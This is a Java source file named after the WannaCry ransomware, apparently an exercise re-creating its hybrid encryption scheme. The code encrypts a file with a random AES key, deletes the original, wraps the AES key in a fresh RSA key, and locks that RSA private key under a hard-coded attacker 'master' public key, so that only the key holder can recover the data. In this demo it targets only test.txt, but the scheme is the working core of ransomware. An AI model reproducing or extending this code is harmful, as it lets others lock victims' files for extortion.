import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import java.security.spec.X509EncodedKeySpec;

public class WannaCry {
	
public static void main(String args[]) throws Exception {
	
	//reading text.txt 
	byte[] z1= {};
	File fi = new File("test.txt");
	z1 = Files.readAllBytes(fi.toPath());
		
	//generating AES key	
	SecureRandom rand = new SecureRandom();
	KeyGenerator generator = KeyGenerator.getInstance("AES");
	generator.init(256, rand);
	SecretKey aeskey = generator.generateKey();
	byte[] ak = aeskey.getEncoded();
		
	//encrypt contents test.txt with aes key
	byte[] ivb = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
	IvParameterSpec iv = new IvParameterSpec(ivb);
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.ENCRYPT_MODE, aeskey, iv);
    byte[] raw = cipher.doFinal(z1);

    
    //write encrypted contents of test.txt into test.txt.cry
    File file = new File("test.txt.cry");
    FileOutputStream fos = new FileOutputStream(file);
    fos.write(raw);
    fos.close();
    
	//deleting test.txt
	fi.deleteOnExit();
	fi.delete();
	
       
    //generating fresh rsa key pair
    KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
	kpg.initialize(512);
	KeyPair kp = kpg.genKeyPair();
	PublicKey pubKey = kp.getPublic();
	PrivateKey privKey = kp.getPrivate();
	
	//encrypting aes key string with rsa public key
	Cipher cipherR = Cipher.getInstance("RSA/ECB/PKCS1Padding");
    cipherR.init(Cipher.ENCRYPT_MODE,pubKey);
    byte[] raw1 = cipherR.doFinal(ak);
	
	//writing rsa ecrypted aes key into aes.key
    File rsaf = new File("aes.key");
    FileOutputStream rfos = new FileOutputStream(rsaf);
    rfos.write(raw1);
    rfos.close();
    
    
    //converting fresh rsa's private key to string
    byte[] frsaPrKey = privKey.getEncoded();
    
    //converting master rsa public key from string to a key
    String masterRSApubkey = "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAidRWp1iB0s2LKnAyAxUKCMmsKK9bMTdRUItZ"
    		+ "VRcV4lB0RXGla0wRTNeR6r5oqNo6poHUJ+QGPjAHDCzt/MjAZdtuMSQ+Lohn+TjDMIEi2sUNeXhZuXch"
    		+ "w/EE+3QTgPpIOGhjJtv4wmTjXD5UaZbYWuydNpgvFEDsF4jf02xM8t8a7nOgQIriPi83f/a4XHXcoCcG"
    		+ "EHDbpbtYUhVq12rJEBXUoVM1zi9LcDhEsgil/pzRPlkT6zC+89SkgYHWTRtO2shLpJcnThkR1nyLqHU2"
    		+ "Zgn1hSrNsy+T97bNL1Umhcs7/e94WJ7WWO6PoSs/t4cknPIZhhRbeBHoJ9rdV+XLBoew7buDQSht2Jn/"
    		+ "zAm6A6Pvi+XhLVRlIEMLOsG6Y92Lwhuc21oS/Keqklv9yDfMznJm0aeCbm3TWZehAfPD9EKJ4LgvSVbT"
    		+ "tXSiOVvPS8JtzIedISqioSvPPP5v4qqdbqobGBv2uE0sdwYhXh+dTIFSO4WG+dQHMZpdZu38l/FBec3y"
    		+ "EuZJuK/pvtX5AvdYgCEwMioZxE3ph4X3S/JEbcqfR1KuuGnYwg6nmSEwotDVg55pEtSsgu3j2KRgM8GA"
    		+ "7lkageikM4D6m/q6vQ5fkedfzz8PuvQn/Ne8BH3h2UZYmRjNvfKd8wt2bRKKFK7K4jCYT5riYo+5aEWS"
    		+ "SrWvL+ECAwEAAQ==";
    
     byte[] bKey = Base64.getDecoder().decode(masterRSApubkey.getBytes());    
     X509EncodedKeySpec XpubKey  = new X509EncodedKeySpec(bKey);
     KeyFactory kf = KeyFactory.getInstance("RSA");

     Key masterpubKey = kf.generatePublic(XpubKey);
    

     //encrypting fresh rsa private key with rsa master public key 
     Cipher cipherRR = Cipher.getInstance("RSA/ECB/PKCS1Padding");
     cipherRR.init(Cipher.ENCRYPT_MODE,masterpubKey);
     byte[] raw2 = cipherRR.doFinal(frsaPrKey);
    
     //writing rsa master public key encrypted fresh rsa private key into wannacry.key 
     File rsafPrKey = new File("wannacry.key");
     FileOutputStream rffos = new FileOutputStream(rsafPrKey);
     rffos.write(raw2);
     rffos.close();
  
      }
}
